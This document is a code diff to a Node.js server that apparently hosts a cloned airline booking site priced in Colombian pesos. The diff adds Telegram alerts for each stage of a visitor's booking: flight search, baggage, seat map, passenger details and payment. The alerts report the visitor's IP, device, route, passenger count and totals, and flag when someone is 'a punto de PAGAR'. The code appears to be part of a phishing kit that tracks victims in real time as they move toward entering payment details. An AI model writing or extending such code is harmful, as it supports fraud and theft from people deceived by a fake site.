@@ -75,7 +75,7 @@ function serve(cloneDir, port) {
             sessions[sid] = {
                 currentFlowStep: 'homepage',
                 bookingCreated: false,
-                notifiedIPs: { flight: new Set(), payment: new Set() },
+                notifiedIPs: { flight: new Set(), baggage: new Set(), seatmap: new Set(), passengers: new Set(), payment: new Set() },
                 searchContext: {
                     recorded: { ...cloneRoundTrip.recordedFlightParams },
                     current: { ...cloneRoundTrip.recordedFlightParams },
@@ -1683,24 +1683,43 @@ function serve(cloneDir, port) {
         if (ua.includes('android')) deviceType = 'Android';
         else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ipod')) deviceType = 'iOS';
         else if (ua.includes('mobile')) deviceType = 'Mobile';
-        const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.socket?.remoteAddress || 'Desconocido';
+        const rawIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.socket?.remoteAddress || 'Desconocido';
+        const ip = typeof rawIp === 'string' ? rawIp.split(',')[0].trim() : rawIp;
+
+        // Backwards compatibility for active ongoing sessions
+        if (!req.session.notifiedIPs.baggage) req.session.notifiedIPs.baggage = new Set();
+        if (!req.session.notifiedIPs.seatmap) req.session.notifiedIPs.seatmap = new Set();
+        if (!req.session.notifiedIPs.passengers) req.session.notifiedIPs.passengers = new Set();
+
+        const adults = parseInt(req.session.searchContext.current.adults || '1', 10);
+        const children = parseInt(req.session.searchContext.current.children || '0', 10);
+        const infants = parseInt(req.session.searchContext.current.infants || '0', 10);
+        const paxCount = adults + children + infants;
+        const origin = req.session.searchContext.current.origin || 'N/A';
+        const dest = req.session.searchContext.current.destination || 'N/A';
+        const total = req.session.searchContext.selectedFlights.grandTotal || 0;
+        const formattedTotal = total.toLocaleString('es-CO');
 
         if (req.session.currentFlowStep === 'flight-results' && !req.session.notifiedIPs.flight.has(ip)) {
             req.session.notifiedIPs.flight.add(ip);
-            const msg = `🛫 <b>Alguien en Selección de Vuelo</b>\n💻 <b>Dispositivo:</b> ${deviceType}\n🌐 <b>IP:</b> ${ip}`;
+            const msg = `🛫 <b>Alguien buscando vuelos</b>\n💻 <b>Dispositivo:</b> ${deviceType}\n🌐 <b>IP:</b> ${ip}\n📍 <b>Ruta:</b> ${origin} ➔ ${dest}\n👥 <b>Pasajeros:</b> ${paxCount}`;
+            sendTelegramMessage(msg);
+        } else if (req.session.currentFlowStep === 'baggage' && !req.session.notifiedIPs.baggage.has(ip)) {
+            req.session.notifiedIPs.baggage.add(ip);
+            const msg = `🎒 <b>Alguien en Equipaje</b>\n🌐 <b>IP:</b> ${ip}\n💰 <b>Subtotal Vuelo:</b> $${formattedTotal} COP`;
+            sendTelegramMessage(msg);
+        } else if (req.session.currentFlowStep === 'seatmap' && !req.session.notifiedIPs.seatmap.has(ip)) {
+            req.session.notifiedIPs.seatmap.add(ip);
+            const msg = `💺 <b>Alguien eligiendo Asientos</b>\n🌐 <b>IP:</b> ${ip}\n💰 <b>Subtotal:</b> $${formattedTotal} COP`;
+            sendTelegramMessage(msg);
+        } else if (req.session.currentFlowStep === 'passengers' && !req.session.notifiedIPs.passengers.has(ip)) {
+            req.session.notifiedIPs.passengers.add(ip);
+            const msg = `👤 <b>Alguien llenando Datos de Pasajeros</b>\n🌐 <b>IP:</b> ${ip}\n💰 <b>Subtotal:</b> $${formattedTotal} COP`;
             sendTelegramMessage(msg);
         } else if (req.session.currentFlowStep === 'payment' && !req.session.notifiedIPs.payment.has(ip)) {
             req.session.notifiedIPs.payment.add(ip);
-            const adults = parseInt(req.session.searchContext.current.adults || '1', 10);
-            const children = parseInt(req.session.searchContext.current.children || '0', 10);
-            const infants = parseInt(req.session.searchContext.current.infants || '0', 10);
-            const paxCount = adults + children + infants;
-            const origin = req.session.searchContext.current.origin || 'N/A';
-            const dest = req.session.searchContext.current.destination || 'N/A';
             const depDate = req.session.searchContext.current.departureDate || 'N/A';
             const retDate = req.session.searchContext.current.returnDate;
-            const total = req.session.searchContext.selectedFlights.grandTotal || 0;
-            const formattedTotal = total.toLocaleString('es-CO');
 
             let msg = `💳 <b>Alguien a punto de PAGAR</b>\n` +
                 `💻 <b>Dispositivo:</b> ${deviceType}\n` +
@@ -1711,7 +1730,7 @@ function serve(cloneDir, port) {
                 msg += ` | <b>Vuelta:</b> ${retDate}`;
             }
             msg += `\n👥 <b>Pasajeros:</b> ${paxCount} (A:${adults} C:${children} I:${infants})\n` +
-                `💰 <b>Total:</b> $${formattedTotal} COP`;
+                `💰 <b>TOTAL:</b> $${formattedTotal} COP`;
 
             sendTelegramMessage(msg);
         }
